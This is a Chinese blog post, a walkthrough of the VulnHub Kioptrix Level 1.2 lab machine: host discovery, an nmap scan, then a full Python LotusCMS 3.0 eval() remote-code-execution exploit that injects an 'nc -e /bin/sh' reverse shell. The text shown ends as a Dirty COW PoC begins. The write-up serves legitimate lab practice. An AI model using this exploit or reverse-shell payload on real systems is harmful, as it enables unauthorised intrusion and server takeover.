<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.css" integrity="sha256-6cQIC71/iBIYXFK+0RHAvwmjwWzkWd+r7v/BX3/vZDc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"z9m8r8.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="该文章暂无概述">
<meta property="og:type" content="article">
<meta property="og:title" content="Kioptrix: Level 1.2">
<meta property="og:url" content="https://z9m8r8.github.io/2024/10/03/Kioptrix%20Level%201.2/index.html">
<meta property="og:site_name" content="Phantom&#39;s Blog">
<meta property="og:description" content="该文章暂无概述">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2024-10-02T16:00:00.000Z">
<meta property="article:modified_time" content="2024-10-11T01:32:21.315Z">
<meta property="article:author" content="Phantom">
<meta property="article:tag" content="Vulnhub">
<meta property="article:tag" content="信息收集">
<meta property="article:tag" content="提权">
<meta property="article:tag" content="反弹 shell">
<meta property="article:tag" content="Buffer Overflow">
<meta property="article:tag" content="缓冲区溢出">
<meta property="article:tag" content="RCE">
<meta property="article:tag" content="Dirty COW">
<meta property="article:tag" content="SQL Injection">
<meta property="article:tag" content="LotusCMS">
<meta property="article:tag" content="LFI">
<meta property="article:tag" content="ASLR">
<meta property="article:tag" content="HT 提权">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://z9m8r8.github.io/2024/10/03/Kioptrix%20Level%201.2/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://z9m8r8.github.io/2024/10/03/Kioptrix%20Level%201.2/","path":"2024/10/03/Kioptrix Level 1.2/","title":"Kioptrix: Level 1.2"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Kioptrix: Level 1.2 | Phantom's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Phantom's Blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">人若无名，便可专心练剑！</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1. 信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="nav-text">1.1. 主机探测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">1.2. 端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1.3. Web 信息收集</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB"><span class="nav-text">2. 渗透攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-shell"><span class="nav-text">2.1. 获取 shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">2.2. 提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%9B%98"><span class="nav-text">3. 复盘</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#lotuscms-3.0-rce"><span class="nav-text">3.1. LotusCMS 3.0 RCE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lfi"><span class="nav-text">3.2. LFI</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql-%E6%B3%A8%E5%85%A5"><span class="nav-text">3.3. SQL 注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#loneferret-%E7%94%A8%E6%88%B7%E6%8F%90%E6%9D%83"><span class="nav-text">3.4. loneferret 用户提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#local-buffer-overflow"><span class="nav-text">3.5. Local Buffer Overflow</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%84%E5%88%A9%E7%94%A8"><span class="nav-text">3.5.1. 常规利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#aslr-%E7%BB%95%E8%BF%87%E6%B3%95"><span class="nav-text">3.5.2. ASLR 绕过法</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cve-2016-5195"><span class="nav-text">3.6. CVE-2016-5195</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">4. 参考</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Phantom"
      src="/images/avatar.png">
  <p class="site-author-name" itemprop="name">Phantom</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">178</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">25</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">166</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/z9m8r8" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://www.cnblogs.com/z9m8r8" title="博客园 → https:&#x2F;&#x2F;www.cnblogs.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fa-solid fa-blog fa-fw"></i>博客园</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://z9m8r8.github.io/2024/10/03/Kioptrix%20Level%201.2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="Phantom">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Phantom's Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Kioptrix: Level 1.2 | Phantom's Blog">
      <meta itemprop="description" content="该文章暂无概述">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Kioptrix: Level 1.2
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2024-10-03 00:00:00" itemprop="dateCreated datePublished" datetime="2024-10-03T00:00:00+08:00">2024-10-03</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2024-10-11 09:32:21" itemprop="dateModified" datetime="2024-10-11T09:32:21+08:00">2024-10-11</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>7.4k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>27 分钟</span>
    </span>
</div>

            <div class="post-description">该文章暂无概述</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><blockquote>
<p>靶机：<a
target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/kioptrix-level-12-3,24/">Kioptrix:
Level 1.2 (#3) ~ VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
<p>靶机：192.168.159.206</p>
<p>README.txt 提示修改 hosts：kioptrix3.com <span
class="math inline">\(\Rightarrow\)</span> 192.168.159.206</p>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># nmap -sS -sV 192.168.159.206 -p- </span></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-01 06:00 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> kioptrix3.com (192.168.159.206)</span><br><span class="line">Host is up (0.0023s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/<span class="number">5.2</span>.<span class="number">4</span>-<span class="number">2</span>ubuntu5.<span class="number">6</span> with Suhosin-Patch)</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:<span class="number">6</span>F:DD:FF (VMware)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned in <span class="number">15.35</span> seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="web-信息收集">1.3. Web 信息收集</h3>
<p>80 部署了 LotusCMS</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410012226526.jpg" /></p>
<p>该 CMS 存在 RCE 漏洞，经测是有效的</p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="获取-shell">2.1. 获取 shell</h3>
<p>exploit.py【<a
target="_blank" rel="noopener" href="https://github.com/nguyen-ngo/LotusCMS-3.0-RCE-exploit">GitHub -
LotusCMS-3.0-RCE-exploit</a>】</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys, re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">banner =<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        /***</span></span><br><span class="line"><span class="string">        *      _        _              ___ __  __ ___  </span></span><br><span class="line"><span class="string">        *     | |   ___| |_ _  _ ___  / __|  \/  / __| </span></span><br><span class="line"><span class="string">        *     | |__/ _ \  _| || (_-&lt; | (__| |\/| \__ \ </span></span><br><span class="line"><span class="string">        *     |____\___/\__|\_,_/__/  \___|_|  |_|___/ </span></span><br><span class="line"><span class="string">        *</span></span><br><span class="line"><span class="string">        *     Exploit eval() Remote Command Execution</span></span><br><span class="line"><span class="string">        *                                                   </span></span><br><span class="line"><span class="string">        ***/</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_local_ip</span>():</span><br><span class="line">    output = subprocess.check_output([<span class="string">&quot;ifconfig&quot;</span>,<span class="string">&quot;eth0&quot;</span>]).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    ip_pattern = <span class="string">r&quot;inet (?P&lt;ip&gt;((\d*).)&#123;4&#125;)&quot;</span></span><br><span class="line">    result = re.search(ip_pattern,output)</span><br><span class="line">    <span class="keyword">return</span> result.group(<span class="string">&quot;ip&quot;</span>).rstrip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_param</span>(<span class="params">ssl, rh, rp, uri</span>):</span><br><span class="line">    <span class="keyword">if</span> ssl:</span><br><span class="line">        url = <span class="string">f&quot;https://<span class="subst">&#123;rh&#125;</span>:<span class="subst">&#123;rp&#125;</span><span class="subst">&#123;uri&#125;</span>index.php?page=index&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        url = <span class="string">f&quot;http://<span class="subst">&#123;rh&#125;</span>:<span class="subst">&#123;rp&#125;</span><span class="subst">&#123;uri&#125;</span>index.php?page=index&quot;</span></span><br><span class="line">    req = requests.get(url)</span><br><span class="line">    <span class="keyword">return</span> req.status_code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_vuln</span>(<span class="params">ssl, rh, rp, uri</span>):</span><br><span class="line">    <span class="keyword">if</span> ssl:</span><br><span class="line">        url = <span class="string">f&quot;https://<span class="subst">&#123;rh&#125;</span>:<span class="subst">&#123;rp&#125;</span><span class="subst">&#123;uri&#125;</span>index.php?page=index%27%29%3B%24%7Bprint%28%27RCEVulnerable%27%29%7D%3B%23&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        url = <span class="string">f&quot;http://<span class="subst">&#123;rh&#125;</span>:<span class="subst">&#123;rp&#125;</span><span class="subst">&#123;uri&#125;</span>index.php?page=index%27%29%3B%24%7Bprint%28%27RCEVulnerable%27%29%7D%3B%23&quot;</span></span><br><span class="line">    req = requests.get(url)</span><br><span class="line">    content = req.content</span><br><span class="line">    result = <span class="built_in">str</span>(content).find(<span class="string">&quot;RCEVulnerable&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">ssl, rh, rp, uri, lh, lp</span>):</span><br><span class="line">    <span class="keyword">if</span> ssl:</span><br><span class="line">        url = <span class="string">f&quot;https://<span class="subst">&#123;rh&#125;</span>:<span class="subst">&#123;rp&#125;</span><span class="subst">&#123;uri&#125;</span>index.php?page=index%27%29%3B%24%7Bsystem%28%27nc%20-e%20%2fbin%2fsh%20<span class="subst">&#123;lh&#125;</span>%20<span class="subst">&#123;lp&#125;</span>%27%29%7D%3B%23%22&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        url = <span class="string">f&quot;http://<span class="subst">&#123;rh&#125;</span>:<span class="subst">&#123;rp&#125;</span><span class="subst">&#123;uri&#125;</span>index.php?page=index%27%29%3B%24%7Bsystem%28%27nc%20-e%20%2fbin%2fsh%20<span class="subst">&#123;lh&#125;</span>%20<span class="subst">&#123;lp&#125;</span>%27%29%7D%3B%23%22&quot;</span></span><br><span class="line">    req = requests.get(url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(prog=<span class="string">&quot;lotuscms&quot;</span>,</span><br><span class="line">                                     description=<span class="string">&quot;Tool to exploit LotusCMS 3.0 eval() RCE vulnerable.&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-rh&quot;</span>, metavar=<span class="string">&quot;RHOST&quot;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&quot;Target Host.&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-rp&quot;</span>, metavar=<span class="string">&quot;RPORT&quot;</span>, default=<span class="string">&quot;80&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Target Port. Default: 80&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-u&quot;</span>, metavar=<span class="string">&quot;URI&quot;</span>, default=<span class="string">&quot;/&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;URI (i.e /lms/. Default: /&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-lh&quot;</span>, metavar=<span class="string">&quot;LHOST&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Local Host.&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-lp&quot;</span>, metavar=<span class="string">&quot;LPORT&quot;</span>, default=<span class="string">&quot;444&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Local Port. Default: 444&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-s&quot;</span>, action=<span class="string">&quot;store_true&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;SSL/TLS enable (True/False). Default: False&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">1</span>:</span><br><span class="line">        parser.print_help()</span><br><span class="line">        parser.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    args=parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.lh <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        args.lh = get_local_ip()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Checking page param: /index.php?page=index ...&quot;</span>)</span><br><span class="line">    vuln_exist = check_param(args.s, args.rh, args.rp, args.u)</span><br><span class="line">    <span class="keyword">if</span> vuln_exist != <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;==&gt; page param not found.&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;==&gt; page param found.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Checking if page is vulnerable to RCE ...&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> check_vuln(args.s, args.rh, args.rp, args.u) == -<span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;==&gt; page is not vulnerable.&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;==&gt; page is vulnerable.&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Exploiting ...&quot;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                    exploit(args.s, args.rh, args.rp, args.u, args.lh, args.lp)</span><br><span class="line">            <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;User interrupted.&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">                <span class="built_in">print</span>(err)</span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Bye bye.&quot;</span>)</span><br><span class="line">                sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410012232270.jpg" /></p>
<p>获得 www-data 权限</p>
<h3 id="提权">2.2. 提权</h3>
<p>查 Linux 内核版本推测可能存在 dirtycow 漏洞【CVE-2016-5195】</p>
<p>示例 poc: dirty.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span 